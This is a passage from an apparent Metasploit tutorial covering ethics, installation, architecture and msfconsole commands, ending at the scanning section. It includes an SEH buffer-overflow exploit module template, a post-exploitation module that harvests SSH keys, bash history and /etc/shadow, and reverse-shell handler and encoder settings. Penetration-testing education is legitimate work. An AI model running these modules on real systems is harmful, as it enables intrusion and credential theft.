# Metasploit Framework: The Complete Professional Guide by [EFXTv](https://t.me/efxtv)
## Including Ethical APK Embedding & Payload Development

---

> **By EFXTv** | Comprehensive Professional Edition
> 
> *"The art of war teaches us to rely not on the likelihood of the enemy's not coming, but on our own readiness to receive him."* — Sun Tzu

---

> ⚠️ **LEGAL DISCLAIMER**: This guide is strictly for **authorized security testing**, **educational purposes**, and **ethical penetration testing**. Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (CFAA), the UK Computer Misuse Act, and equivalent laws worldwide. Always obtain **written authorization** before testing. The author (EFXTv) assumes no responsibility for misuse of this information.

---

## Table of Contents

1. [Introduction to Metasploit](#1-introduction-to-metasploit)
2. [Understanding the Ethical Framework](#2-understanding-the-ethical-framework)
3. [Installation & Environment Setup](#3-installation--environment-setup)
4. [Metasploit Architecture Deep Dive](#4-metasploit-architecture-deep-dive)
5. [The Metasploit Console (msfconsole)](#5-the-msfconsole)
6. [Modules: Exploits, Payloads, Encoders, Nops, Auxiliaries](#6-modules-deep-dive)
7. [Payloads: The Heart of Metasploit](#7-payloads-deep-dive)
8. [Meterpreter: The Ultimate Payload](#8-meterpreter-deep-dive)
9. [APK Embedding: Ethical Payload Development](#9-ethical-apk-embedding)
10. [Android Penetration Testing with Metasploit](#10-android-penetration-testing)
11. [Network Exploitation](#11-network-exploitation)
12. [Post-Exploitation Techniques](#12-post-exploitation)
13. [Pivoting and Lateral Movement](#13-pivoting-and-lateral-movement)
14. [Evading Detection & Anti-Virus](#14-evasion-techniques)
15. [Social Engineering with Metasploit](#15-social-engineering)
16. [Web Application Testing](#16-web-application-testing)
17. [Client-Side Attacks](#17-client-side-attacks)
18. [Wireless Attacks](#18-wireless-attacks)
19. [Password Attacks](#19-password-attacks)
20. [Maintaining Access](#20-maintaining-access)
21. [Covering Tracks](#21-covering-tracks)
22. [Database Integration](#22-database-integration)
23. [Metasploit Pro Features](#23-metasploit-pro)
24. [Automation with Resource Scripts](#24-automation)
25. [Custom Module Development](#25-custom-module-development)
26. [Reporting & Documentation](#26-reporting)
27. [Real-World Ethical Scenarios](#27-real-world-scenarios)
28. [Troubleshooting Common Issues](#28-troubleshooting)
29. [Cheat Sheets](#29-cheat-sheets)
30. [Resources & Further Learning](#30-resources)

---

## 1. Introduction to Metasploit

### 1.1 What is Metasploit?

Metasploit is the world's most widely used penetration testing framework. Originally created by HD Moore in 2003 as a portable network tool, it has evolved into the industry-standard platform for security research, penetration testing, and vulnerability assessment.

**Core Capabilities:**

```
Metasploit Framework
├── Exploit Development & Execution
│   ├── Remote exploits
│   ├── Local privilege escalation
│   ├── Client-side attacks
│   └── Web application exploits
├── Payload Generation
│   ├── Meterpreter (advanced payload)
│   ├── Command shells (bind/reverse)
│   ├── DLL injection
│   ├── APK/Android payloads
│   └── Stageless/Staged payloads
├── Auxiliary Modules
│   ├── Scanners
│   ├── Fuzzers
│   ├── Denial of Service
│   └── Information gathering
├── Post-Exploitation
│   ├── System enumeration
│   ├── Credential harvesting
│   ├── Pivoting
│   ├── Persistence
│   └── Data exfiltration
├── Encoding & Evasion
│   ├── Payload encoders
│   ├── Packers
│   ├── Anti-Virus evasion
│   └── Obfuscation
└── Integration & Automation
    ├── Database (PostgreSQL)
    ├── Resource scripts
    ├── REST API
    ├── Third-party tools
    └── Custom modules (Ruby)
```

### 1.2 Metasploit Editions

| Edition | Description | License | Best For |
|---------|-------------|---------|----------|
| **Metasploit Framework (MSF)** | Open-source command-line framework | BSD | Security researchers, learning, custom development |
| **Metasploit Pro** | Commercial GUI-based platform | Commercial | Enterprise teams, compliance, automated testing |
| **Metasploit Community** | Free limited GUI version | Free | Small teams, basic testing |
| **Armitage** | Free GUI for MSF | Free | Visual attack planning, team collaboration |

### 1.3 Metasploit's Place in the Penetration Testing Lifecycle

```
┌─────────────────────────────────────────────────────────────────┐
│                  PENETRATION TESTING LIFECYCLE                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. Planning & Reconnaissance                                   │
│     ├── OSINT (Open Source Intelligence)                         │
│     ├── Network scanning (Nmap integration)                     │
│     ├── Service enumeration                                     │
│     └── Vulnerability identification                            │
│              ↓                                                   │
│  2. Scanning & Enumeration                                       │
│     ├── Auxiliary scanners                                       │
│     ├── Service fingerprinting                                  │
│     └── Vulnerability validation                                │
│              ↓                                                   │
│  3. Gaining Access ← METASPLOT EXCELS HERE                      │
│     ├── Exploit execution                                       │
│     ├── Payload delivery                                        │
│     ├── Client-side attacks                                     │
│     └── Social engineering                                      │
│              ↓                                                   │
│  4. Maintaining Access                                           │
│     ├── Persistence mechanisms                                  │
│     ├── Backdoors                                               │
│     └── C2 (Command & Control)                                  │
│              ↓                                                   │
│  5. Post-Exploitation                                            │
│     ├── Pivoting to other systems                               │
│     ├── Credential harvesting                                   │
│     ├── Data exfiltration                                       │
│     └── Evidence gathering                                      │
│              ↓                                                   │
│  6. Reporting                                                    │
│     ├── Documentation                                           │
│     ├── Remediation recommendations                             │
│     └── Executive summary                                       │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 1.4 Key Terminology

| Term | Definition |
|------|-----------|
| **Exploit** | Code that takes advantage of a vulnerability |
| **Payload** | Code executed after successful exploitation |
| **Shell** | Command-line interface to a compromised system |
| **Meterpreter** | Advanced in-memory payload with rich API |
| **Listener** | Metasploit module waiting for incoming connections |
| **Stager** | Small payload that establishes connection and downloads stage |
| **Stage** | Larger payload delivered by stager |
| **Encoder** | Transforms payload to evade detection |
| **Nop (NOP Sled)** | No-operation instructions for alignment |
| **Handler** | Module that handles incoming payload connections |
| **Session** | Active connection to a compromised target |
| **Post Module** | Module run after gaining access |
| **Auxiliary Module** | Non-exploit module (scanner, fuzzer, etc.) |
| **LHOST** | Listener/host IP address |
| **LPORT** | Listener/port number |
| **RHOST** | Remote/target host |
| **RPORT** | Remote/target port |
| **Payload Stage** | Final payload (e.g., Meterpreter) |
| **Single/Staged/Stagless** | Payload delivery mechanisms |

---

## 2. Understanding the Ethical Framework

### 2.1 The Ethics of Penetration Testing

```
╔═══════════════════════════════════════════════════════════════╗
║                    ETHICAL PRINCIPLES                          ║
╠═══════════════════════════════════════════════════════════════╣
║                                                                ║
║  1. AUTHORIZATION: Never test without explicit written consent ║
║                                                                ║
║  2. SCOPE: Stay within defined boundaries                      ║
║                                                                ║
║  3. CONFIDENTIALITY: Protect client data                       ║
║                                                                ║
║  4. DO NO HARM: Minimize disruption to systems                 ║
║                                                                ║
║  5. REPORTING: Document everything, report vulnerabilities     ║
║                                                                ║
║  6. PROFESSIONALISM: Maintain high standards                   ║
║                                                                ║
║  7. LEGAL COMPLIANCE: Follow all applicable laws               ║
║                                                                ║
║  8. RESPECT: Respect privacy and organizational policies       ║
║                                                                ║
╚═══════════════════════════════════════════════════════════════╝
```

### 2.2 Legal Framework

```
LAWS AND REGULATIONS TO UNDERSTAND:
├── United States
│   ├── Computer Fraud and Abuse Act (CFAA) - 18 U.S.C. § 1030
│   ├── Electronic Communications Privacy Act (ECPA)
│   ├── Digital Millennium Copyright Act (DMCA)
│   ├── State-specific computer crime laws
│   └── CFAA allows "authorized" testing defense
├── European Union
│   ├── General Data Protection Regulation (GDPR)
│   ├── EU Cybersecurity Act
│   └── National implementations (e.g., UK Computer Misuse Act)
├── International
│   ├── Budapest Convention on Cybercrime
│   ├── ISO 27001 (Information Security)
│   └── PCI DSS (for payment systems)
└── Industry Standards
    ├── PTES (Penetration Testing Execution Standard)
    ├── OWASP Testing Guide
    ├── NIST SP 800-115
    ├── OSSTMM (Open Source Security Testing Methodology)
    └── CREST (Council of Registered Ethical Security Testers)
```

### 2.3 Rules of Engagement (RoE) Template

```markdown
# PENETRATION TESTING RULES OF ENGAGEMENT

## Client Information
- Organization: [Client Name]
- Contact: [Primary Contact]
- Emergency Contact: [24/7 Contact]

## Authorization
- Written authorization attached: ☐
- Scope document attached: ☐
- NDA signed: ☐
- Insurance verified: ☐

## Scope Definition
### In-Scope Systems
- IP Range: [e.g., 192.168.1.0/24]
- Domains: [e.g., *.example.com]
- Applications: [List specific apps]
- Mobile Apps: [Package names]

### Out-of-Scope Systems
- [List explicitly excluded systems]
- Production databases (read-only only)
- Physical security systems
- Third-party hosted services (without permission)

## Testing Windows
- Allowed Hours: [e.g., Mon-Fri 9AM-5PM]
- Emergency Stop: [Keyword/procedure]
- Blackout Periods: [Times when testing is forbidden]

## Testing Methods
### Allowed
- Network scanning and enumeration
- Vulnerability exploitation
- Social engineering (if in scope)
- Physical testing (if in scope)

### Prohibited
- Denial of Service (DoS) attacks
- Data destruction
- Modification of production data
- Attacks against third parties
- Credential stuffing with real passwords
- Installing persistent backdoors (unless agreed)

## Communication
- Daily status updates: ☐ Required
- Critical finding notification: [within X hours]
- Weekly reports: ☐ Required
- Final report deadline: [Date]

## Data Handling
- All findings encrypted: ☐
- Evidence storage: [Method]
- Data retention period: [Duration]
- Secure deletion method: [Method]

## Emergency Procedures
- System crash: [Procedure]
- Data breach during test: [Procedure]
- Legal issues: [Procedure]
- Out-of-scope compromise: [Procedure]

## Signatures
- Tester: _________________ Date: _______
- Client: ________________ Date: _______
- Legal: _________________ Date: _______
```

### 2.4 Responsible Disclosure Policy

```
RESPONSIBLE DISCLOSURE TIMELINE:
├── Day 0: Vulnerability discovered
├── Day 0-1: Document finding with proof of concept
├── Day 1-3: Report to organization (through proper channels)
├── Day 3-30: Organization acknowledges and begins remediation
├── Day 30-60: Organization develops and tests fix
├── Day 60-90: Fix deployed, coordinated public disclosure
├── Day 90+: Public disclosure (if not fixed)
│
└── EXCEPTIONS:
    ├── Active exploitation in the wild → Expedited disclosure
    ├── No response from vendor → Escalate through CERT
    └── Critical infrastructure → Contact national CERT
```

---

## 3. Installation & Environment Setup

### 3.1 Kali Linux (Recommended Primary Platform)

Kali Linux comes with Metasploit pre-installed and is the recommended platform.

```bash
# Verify Metasploit is installed
msfconsole --version
# Output: Framework Version: 6.x.x

# If not installed or needs update
sudo apt update
sudo apt install metasploit-framework

# Initialize the database
sudo msfdb init

# Verify database status
sudo msfdb status

# Start the database service
sudo systemctl start postgresql

# Verify database connection in msfconsole
msfconsole -q -x "db_status; exit"
```

### 3.2 Manual Installation on Various Distributions

#### Ubuntu/Debian

```bash
# Install dependencies
sudo apt update
sudo apt install -y build-essential zlib1g-dev libpq-dev \
    libpcap-dev libsqlite3-dev curl git autoconf bison \
    libssl-dev libyaml-dev libreadline-dev libncurses5-dev \
    libffi-dev libgdbm-dev postgresql postgresql-client

# Install Ruby (if not present)
sudo apt install ruby ruby-dev

# Method 1: Quick Installer (Recommended)
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > /tmp/msfinstall
chmod +x /tmp/msfinstall
/tmp/msfinstall

# Method 2: Git Clone
cd /opt
sudo git clone https://github.com/rapid7/metasploit-framework.git
sudo chown -R $(whoami):$(whoami) metasploit-framework
cd metasploit-framework

# Install bundler and dependencies
gem install bundler
bundle install

# Create symlinks
sudo ln -sf /opt/metasploit-framework/msfconsole /usr/local/bin/msfconsole
sudo ln -sf /opt/metasploit-framework/msfvenom /usr/local/bin/msfvenom
sudo ln -sf /opt/metasploit-framework/msfrpcd /usr/local/bin/msfrpcd
```

#### CentOS/RHEL/Fedora

```bash
# Install dependencies
sudo dnf install -y gcc zlib-devel libpqxx-devel libpcap-devel \
    sqlite-devel curl git openssl-devel readline-devel \
    ncurses-devel libffi-devel postgresql-server postgresql

# Initialize PostgreSQL
sudo postgresql-setup --initdb
sudo systemctl start postgresql
sudo systemctl enable postgresql

# Install Metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > /tmp/msfinstall
chmod +x /tmp/msfinstall
/tmp/msfinstall
```

#### macOS

```bash
# Using Homebrew
brew install metasploit

# Or using the installer
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > /tmp/msfinstall
chmod +x /tmp/msfinstall
/tmp/msfinstall
```

#### Windows

```
1. Download installer from: https://www.metasploit.com/download
2. Run the installer (metasploit-latest.msi)
3. Follow the installation wizard
4. Metasploit will be installed to C:\metasploit-framework
5. Access via Start Menu or command line
```

#### Docker Installation

```bash
# Pull the official Metasploit Docker image
docker pull metasploitframework/metasploit-framework

# Run interactively
docker run --rm -it \
    -v ~/.msf4:/home/msf/.msf4 \
    -v /tmp:/tmp/data \
    metasploitframework/metasploit-framework \
    ./msfconsole

# Run with network access
docker run --rm -it --net=host \
    -v ~/.msf4:/home/msf/.msf4 \
    metasploitframework/metasploit-framework \
    ./msfconsole

# Docker Compose for full setup (with database)
cat > docker-compose.yml << 'EOF'
version: '3'
services:
  db:
    image: postgres:14
    environment:
      POSTGRES_USER: msf
      POSTGRES_PASSWORD: msf_password
      POSTGRES_DB: msf_database
    volumes:
      - pgdata:/var/lib/postgresql/data

  msf:
    image: metasploitframework/metasploit-framework
    depends_on:
      - db
    environment:
      DATABASE_URL: postgres://msf:msf_password@db:5432/msf_database
    volumes:
      - ~/.msf4:/home/msf/.msf4
      - ./data:/tmp/data
    network_mode: host
    stdin_open: true
    tty: true

volumes:
  pgdata:
EOF

docker-compose up -d
docker-compose run msf ./msfconsole
```

### 3.3 Database Configuration

```bash
# Initialize Metasploit database
sudo msfdb init

# Check database status
sudo msfdb status

# Start/stop database
sudo msfdb start
sudo msfdb stop
sudo msfdb reinit  # Reinitialize (clears data)

# Database configuration file
cat /opt/metasploit-framework/config/database.yml
# OR
cat ~/.msf4/database.yml

# Manual PostgreSQL setup
sudo -u postgres createuser msf_user -P
sudo -u postgres createdb msf_database -O msf_user

# Connect in msfconsole
msfconsole
msf6 > db_status
msf6 > db_connect msf_user:password@localhost/msf_database

# Alternative: Use YAML config
cat > ~/.msf4/database.yml << 'EOF'
production:
  adapter: postgresql
  database: msf_database
  username: msf_user
  password: your_password
  host: localhost
  port: 5432
  pool: 5
  timeout: 5
EOF
```

### 3.4 Network Configuration for Testing

```bash
# Create isolated testing network with VirtualBox/VMware
# Network Diagram:
#
# ┌─────────────┐     ┌──────────────┐     ┌──────────────┐
# │   Kali Linux │────│  Virtual NAT  │────│   Internet    │
# │  (Attacker)  │     │   Network    │     │              │
# │ 192.168.1.10 │     │192.168.1.0/24│     └──────────────┘
# └─────────────┘     │              │
#                      │              │     ┌──────────────┐
#                      │              │────│  Target VMs   │
#                      └──────────────┘     │              │
#                                           │ Windows/Linux │
#                                           │ 192.168.1.20  │
#                                           │ Android Emu   │
#                                           │ 192.168.1.30  │
#                                           └──────────────┘

# Configure Kali network interface
sudo ifconfig eth0 192.168.1.10 netmask 255.255.255.0 up

# Verify connectivity
ping -c 3 192.168.1.20

# Configure firewall to allow Metasploit
sudo ufw allow from 192.168.1.0/24
sudo ufw allow 4444/tcp  # Default Meterpreter port
sudo ufw allow 4445/tcp  # Additional listener ports

# IP forwarding (for pivoting)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

### 3.5 Updating Metasploit

```bash
# Method 1: Built-in updater
sudo msfupdate

# Method 2: Via apt (Kali)
sudo apt update && sudo apt upgrade metasploit-framework

# Method 3: Git update
cd /opt/metasploit-framework
git pull
bundle install

# Method 4: Using msfconsole
msfconsole
msf6 > db_rebuild_cache  # Rebuild module cache after update
```

---

## 4. Metasploit Architecture Deep Dive

### 4.1 Directory Structure

```
/opt/metasploit-framework/              # Installation directory
├── msfconsole                          # Main console interface
├── msfvenom                            # Payload generator
├── msfrpcd                             # RPC daemon
├── msfd                                # Daemon console
├── msfdb                               # Database management
├── msfrpc                              # RPC client
├── msfupdate                           # Updater
│
├── modules/                            # All modules
│   ├── exploits/                       # Exploit modules
│   │   ├── android/                    # Android exploits
│   │   ├── apple_ios/                  # iOS exploits
│   │   ├── linux/                      # Linux exploits
│   │   ├── multi/                      # Multi-platform
│   │   ├── unix/                       # Unix exploits
│   │   ├── windows/                    # Windows exploits
│   │   ├── browser/                    # Browser exploits
│   │   ├── fileformat/                 # File format exploits
│   │   └── webapps/                    # Web application exploits
│   │
│   ├── payloads/                       # Payload modules
│   │   ├── singles/                    # Self-contained payloads
│   │   ├── stagers/                    # Connection initiators
│   │   ├── stages/                     # Larger payloads (Meterpreter)
│   │   └── adapters/                   # Payload adapters
│   │
│   ├── auxiliary/                      # Auxiliary modules
│   │   ├── scanner/                    # Port/service scanners
│   │   ├── fuzzers/                    # Protocol fuzzers
│   │   ├── gather/                     # Information gathering
│   │   ├── admin/                      # Admin utilities
│   │   ├── server/                     # Server modules
│   │   ├── dos/                        # Denial of Service
│   │   └── spoof/                      # Spoofing modules
│   │
│   ├── post/                           # Post-exploitation modules
│   │   ├── android/                    # Android post modules
│   │   ├── linux/                      # Linux post modules
│   │   ├── multi/                      # Multi-platform
│   │   ├── osx/                        # macOS post modules
│   │   ├── windows/                    # Windows post modules
│   │   └── hardware/                   # Hardware post modules
│   │
│   ├── encoders/                       # Payload encoders
│   │   ├── cmd/                        # Command encoders
│   │   ├── generic/                    # Generic encoders
│   │   ├── mipsbe/                     # MIPS Big Endian
│   │   ├── x86/                        # x86 encoders
│   │   └── x64/                        # x64 encoders
│   │
│   ├── nops/                           # NOP generators
│   │   └── x86/                        # x86 NOPs
│   │
│   ├── evasion/                        # Evasion modules
│   │   └── windows/                    # Windows evasion
│   │
│   └── exploits/                       # (continued)
│
├── scripts/                            # Meterpreter & resource scripts
│   ├── meterpreter/                    # Meterpreter scripts
│   ├── resource/                       # Resource scripts
│   └── psre/                           # PowerShell scripts
│
├── tools/                              # Standalone tools
│   ├── exploit/                        # Exploit development tools
│   ├── memdump/                        # Memory dump tools
│   ├── payloads/                       # Payload tools
│   ├── patterns/                       # Pattern tools
│   └── dev/                            # Development tools
│
├── data/                               # Data files
│   ├── wordlists/                      # Password lists
│   ├── templates/                      # Payload templates
│   ├── exploits/                       # Exploit data
│   ├── meterpreter/                    # Meterpreter extensions
│   └── payloads/                       # Payload data
│
├── lib/                                # Core libraries
│   ├── msf/                            # Metasploit library
│   ├── rex/                            # Rex library (sockets, etc.)
│   └── msf/core/                       # Core classes
│
└── documentation/                      # Documentation
    └── modules/                        # Module documentation
```

### 4.2 Module Types Explained

#### Exploits

```ruby
# Example exploit module structure
# /modules/exploits/example/vuln_app.rb

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Seh  # For SEH overflow

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Vulnerable App Buffer Overflow',
      'Description'    => %q{
        This module exploits a buffer overflow in VulnApp v1.0.
        The vulnerability exists in the handling of long usernames.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
        'EFXTv',  # Original discovery
        'Researcher'  # Exploit development
      ],
      'References'     => [
        ['CVE', '2024-12345'],
        ['EDB', '12345'],
        ['URL', 'https://example.com/advisory']
      ],
      'Payload'        => {
        'Space'    => 400,
        'BadChars' => "\x00\x0a\x0d",
        'DisableNops' => true
      },
      'Platform'       => 'win',
      'Targets'        => [
        [ 'VulnApp v1.0 on Windows 10', 
          { 'Ret' => 0x10015ffe, 'Offset' => 2606 } 
        ],
        [ 'VulnApp v1.0 on Windows 7', 
          { 'Ret' => 0x10016002, 'Offset' => 2606 } 
        ]
      ],
      'Privileged'     => false,
      'DisclosureDate' => '2024-01-15',
      'DefaultTarget'  => 0
    ))

    register_options([
      Opt::RPORT(9999),
      OptString.new('USERNAME', [false, 'Username for auth', 'admin'])
    ])
  end

  def check
    connect
    sock.put("VERSION\r\n")
    res = sock.get_once
    disconnect
    if res && res =~ /VulnApp v1\.0/
      return Exploit::CheckCode::Appears
    end
    Exploit::CheckCode::Safe
  end

  def exploit
    connect

    buf = rand_text_alpha(target['Offset'])
    buf << generate_seh_record(target.ret)
    buf << make_nops(32)
    buf << payload.encoded

    sock.put("USER #{buf}\r\n")
    sock.put("PASS test\r\n")

    handler
    disconnect
  end
end
```

#### Auxiliary Modules

```ruby
# Example auxiliary scanner module
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Custom Service Version Scanner',
      'Description' => 'Scans for and fingerprints CustomApp',
      'Author'      => ['EFXTv'],
      'License'     => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(8080),
      OptInt.new('TIMEOUT', [true, 'Connection timeout', 10])
    ])
  end

  def run_host(ip)
    begin
      connect
      sock.put("GET /version HTTP/1.0\r\n\r\n")
      res = sock.get_once
      
      if res && res =~ /CustomApp\/(\d+\.\d+)/
        version = $1
        print_good("#{ip}:#{rport} - CustomApp v#{version} found")
        
        report_service(
          host: ip,
          port: rport,
          name: 'customapp',
          info: "CustomApp v#{version}"
        )
      end
    rescue ::Rex::ConnectionError
    ensure
      disconnect
    end
  end
end
```

#### Post Modules

```ruby
# Example post-exploitation module
class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Linux Credential Harvester',
      'Description'   => 'Collects stored credentials from Linux system',
      'License'       => MSF_LICENSE,
      'Author'        => ['EFXTv'],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell', 'meterpreter']
    ))
  end

  def run
    print_status("Running on #{sysinfo['Computer']}")

    # Collect SSH keys
    print_status("Searching for SSH keys...")
    ssh_keys = find_files("/home", "*.pem")
    ssh_keys += find_files("/home", "id_rsa")
    
    ssh_keys.each do |key|
      content = read_file(key)
      print_good("Found SSH key: #{key}")
      loot_path = store_loot(
        "ssh.key",
        "text/plain",
        session,
        content,
        key,
        "SSH private key"
      )
      print_status("Saved to: #{loot_path}")
    end

    # Collect bash history
    print_status("Collecting bash history...")
    history_files = find_files("/home", ".bash_history")
    history_files.each do |hfile|
      content = read_file(hfile)
      if content && !content.empty?
        print_good("History: #{hfile}")
        store_loot("bash.history", "text/plain", session, content, hfile, "Bash History")
      end
    end

    # Collect credentials from common locations
    print_status("Checking common credential locations...")
    cred_files = [
      '/etc/shadow',
      '/etc/mysql/my.cnf',
      '/var/www/html/wp-config.php',
      '/etc/openvpn/auth.txt',
      '/root/.my.cnf'
    ]
    
    cred_files.each do |cfile|
      if file_exist?(cfile)
        content = read_file(cfile)
        print_good("Credential file: #{cfile}")
        store_loot("credentials", "text/plain", session, content, cfile, "Credentials")
      end
    end
  end
end
```

### 4.3 Core Libraries

```
Metasploit Libraries:
├── Rex (Runtime EXploitation)
│   ├── Rex::Socket - Network socket abstraction
│   ├── Rex::Proto - Protocol implementations
│   ├── Rex::Text - Text manipulation
│   ├── Rex::Arch - Architecture support
│   ├── Rex::Encoder - Payload encoding
│   ├── Rex::ElfParsey - ELF parser
│   ├── Rex::PeParsey - PE parser
│   └── Rex::MachParsey - Mach-O parser
│
├── Msf::Core
│   ├── Msf::Module - Base module class
│   ├── Msf::Exploit - Exploit module base
│   ├── Msf::Auxiliary - Auxiliary module base
│   ├── Msf::Post - Post module base
│   ├── Msf::Payload - Payload module base
│   ├── Msf::Encoder - Encoder module base
│   ├── Msf::Nop - NOP module base
│   ├── Msf::Evasion - Evasion module base
│   └── Msf::Plugin - Plugin base
│
└── Msf::Ui
    ├── Msf::Ui::Console - Console interface
    ├── Msf::Ui::Web - Web interface
    └── Msf::Ui::Rpc - RPC interface
```

---

## 5. The Msfconsole

### 5.1 Starting and Configuring

```bash
# Basic startup
msfconsole

# Quiet mode (no banner)
msfconsole -q

# Execute commands on startup
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.10; run"

# Execute resource script
msfconsole -r script.rc

# With specific database
msfconsole -d "postgres://user:pass@host/db"

# Check version
msfconsole -v
```

### 5.2 Essential Commands Reference

```bash
# ==========================================
#           CORE COMMANDS
# ==========================================

# Help
help                    # Show all commands
help <category>         # Help for category
info <module>           # Module information
show <category>         # Show modules of type
search <keyword>        # Search modules

# Banner and version
banner                  # Show banner
version                 # Show version

# Database
db_status               # Check database connection
db_rebuild_cache        # Rebuild module cache
db_disconnect           # Disconnect database
db_connect <uri>        # Connect to database
workspace               # List workspaces
workspace -a <name>     # Add workspace
workspace -d <name>     # Delete workspace
workspace <name>        # Switch workspace

# Console
clear                   # Clear screen
color <true/false>      # Toggle colors
irb                     # Interactive Ruby shell
history                 # Command history
resource <script>       # Execute resource script
makerc <file>           # Save commands to resource file
spool <file>            # Output to file and console
setg <opt> <val>        # Set global variable
unsetg <opt>            # Unset global variable

# ==========================================
#           MODULE COMMANDS
# ==========================================

# Loading modules
use <module>            # Select a module
use <number>            # Select from search results
back                    # Deselect current module
previous                # Select previous module
reload_all              # Reload all modules

# Module information
info                    # Current module info
info -d                 # Module description only
info -o                 # Module options only
info -p                 # Module payloads
info -a                 # Module targets
info -s                 # Module references

# Show modules
show exploits           # All exploit modules
show payloads           # All payload modules
show auxiliary          # All auxiliary modules
show post               # All post-exploitation modules
show encoders           # All encoders
show nops               # All NOP generators
show evasion            # All evasion modules
show options            # Current module options
show advanced           # Advanced options
show targets            # Available targets
show payloads           # Compatible payloads
show actions            # Available actions

# Searching
search <keyword>        # Search by keyword
search type:exploit     # Search by type
search platform:windows # Search by platform
search name:mysql       # Search by name
search cve:2024         # Search by CVE
search author:efxtv     # Search by author
search rank:excellent   # Search by rank
search path:webapp      # Search by path
search type:exploit platform:windows name:ms17  # Combined

# Module configuration
set <option> <value>    # Set option
setg <option> <value>   # Set globally (persists)
get <option>            # Get option value
unset <option>          # Unset option
unset all               # Unset all options
unsetg <option>         # Unset global option
save                    # Save config to ~/.msf4/config

# ==========================================
#           EXECUTION COMMANDS
# ==========================================

# Running modules
run                     # Run exploit/auxiliary
exploit                 # Run exploit (same as run)
exploit -j              # Run as background job
exploit -z               # Run and don't interact
exploit -e <encoder>    # Use specific encoder
exploit -n <nop>        # Use specific NOP
exploit -t <target>     # Use specific target
exploit -p <payload>    # Use specific payload
exploit -h              # Exploit options

check                   # Check if target is vulnerable

# ==========================================
#           SESSION COMMANDS
# ==========================================

# Managing sessions
sessions                # List all sessions
sessions -l             # List (verbose)
sessions -l -v          # List very verbose
sessions -i <id>        # Interact with session
sessions -c <cmd>       # Run command on all sessions
sessions -c <cmd> -i <id>  # Run command on specific session
sessions -k <id>        # Kill session
sessions -K             # Kill all sessions
sessions -u <id>        # Upgrade shell to Meterpreter
sessions -s <script>    # Run Meterpreter script
sessions -n <name> -i <id>  # Name a session

# ==========================================
#           JOB COMMANDS
# ==========================================

jobs                    # List running jobs
jobs -l                 # List (verbose)
jobs -k <id>            # Kill job
jobs -K                 # Kill all jobs

# ==========================================
#           ROUTE COMMANDS
# ==========================================

route                   # Show routes
route add <subnet> <mask> <session_id>  # Add route
route add 10.10.10.0/24 1               # Via session 1
route del <subnet> <mask> <session_id>  # Delete route
route flush             # Remove all routes

# ==========================================
#           RESOURCE SCRIPTS
# ==========================================

resource <script.rc>    # Execute resource script
makerc <file.rc>        # Save history to resource script

# ==========================================
#           RAILGUN (Windows API)
# ==========================================

irb                     # Enter IRB
# Then in Ruby:
# client.railgun.kernel32.GetCurrentProcess()
```

### 5.3 Environment Variables

```bash
# View all environment variables
set

# Common environment variables
set LHOST 192.168.1.10      # Local host (listener)
set LPORT 4444               # Local port (listener)
set RHOST 192.168.1.20       # Remote host (target)
set RPORT 80                 # Remote port (target)
set PAYLOAD windows/meterpreter/reverse_tcp
set TARGET 0
set ENCODER x86/shikata_ga_nai
set EXITFUNC thread
set VERBOSE true
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai

# Global variables (persist across modules)
setg LHOST 192.168.1.10
setg LPORT 4444
```

---

## 6. Modules Deep Dive

### 6.1 Exploit Module Ranks

```
Module Ranking System:
├── ExcellentRanking    - Exploit always works reliably
├── GreatRanking        - Works against most configurations  
├── GoodRanking         - Works against common configurations
├── NormalRanking       - Works against default configurations
├── AverageRanking      - May not work reliably
├── LowRanking          - Unlikely to work reliably
├── ManualRanking       - Requires manual configuration
└── NoRank              - Not ranked

Ranking determines reliability and should guide module selection.
Always prefer higher-ranked modules for reliable exploitation.
```

### 6.2 Scanning & Enumeration

```bash
# ==========================================
#       NETWORK SCANNING MODULES
# ==========================================

# Port Scanner
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set THREADS 50
run

# SYN Scanner (faster, requires root)
use auxiliary/scanner/portscan/syn
set RHOSTS 192.168.1.20
set PORTS 1-10000
set THREADS 20
run

# Service Identification
use auxiliary/scanner/discovery/udp_sweep
set RHOSTS 192.168.1.0/24
run

# SMB Scanner
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
set THREADS 20
run

# ==========================================
#       SERVICE-SPECIFIC SCANNERS
# ==========================================

# SSH
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# FTP
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.0/24
run

use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.168.1.0/24
run

# HTTP
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
set RPORT 80
run

use auxiliary/scanner/http/http_header
set RHOSTS 192.168.1.20
run

use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.20
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run

# MySQL
use auxiliary/scanner/mysql/mysql_version
set RHOSTS 192.168.1.0/24
run

# SMTP
use auxiliary/scanner/smtp/smtp_version
set RHOSTS 192.168.1.0/24
run

use auxiliary/scanner/smtp/smtp_enum
set RHOSTS 192.168.1.20
run

# SNMP
